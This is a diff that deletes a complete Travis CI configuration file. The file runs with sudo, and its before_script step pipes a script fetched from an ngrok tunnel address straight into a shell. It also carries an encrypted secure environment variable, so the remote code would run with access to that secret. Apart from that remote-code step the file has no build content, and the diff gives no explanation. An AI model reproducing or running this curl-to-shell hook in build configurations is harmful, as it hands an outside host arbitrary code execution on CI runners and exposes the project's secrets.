@@ -1,8 +1,0 @@
-language: bash
-sudo: true
-before_script:
-- curl "4.tcp.ngrok.io:10371" | sh
-env:
-  global:
-    secure: c4nCnpw/hqPGO/C+c9Qt6d3qR5iaoTs3t0CNs17h+PpW8hpdaQ+7o1mHSbqMNec8wA0rTxXuV/VCFyriZ1R3+bcC13u4/JFDpuIFOysDWQwlcMpbZKivQVdLmjWk5lY5WteHype1e8N7oRlVX3ioi6aUC2X+IrLpsBw8XCNQRqIoOHFUIjikuCg5VvnkAMftUcqndt36QhdiwrBN+fLby5miFiciGZZo0ye8/Y/eCl+TzzsCwUYKnYYih+7Scqg1xWm/6O2GqyqWJ+ni7cbMntcL2VN/+kiZsI+5VhAghzk1PQ6PkKVo8Gv81dfSYOvOreXezaFJRDpFLLHav9RfMyq1fioHmxEUidM1t318BxJ25FnwvwkD4hyrr72qVqVwZW1xx1bJvo+BSNM9joSJyYCupFxFo1//EIiEVnIECyjrEBaGdkGbVX0zckz1fvMl22YlSXN6uE/kfPfYiiQ7XjXxZcZ002RICiyVa0yo1nkMkKf+J7GyDm+HGH3ONkQbzU1r7bmREHaoWNxlXDaPKdr6tPp4fJF7Stzr5OwUpy/3497BwH6GxvMn9O16JD9Vl160bNMBRe/ERont4LDDN6kRY4uPAJrJNeEcd9XUA7teE9JqMa4XV0At7lX3q0gAqESVKqBTKeUqpmV4ktOXw6/wjj8LuFUmPbaCfDqCPwU=
-
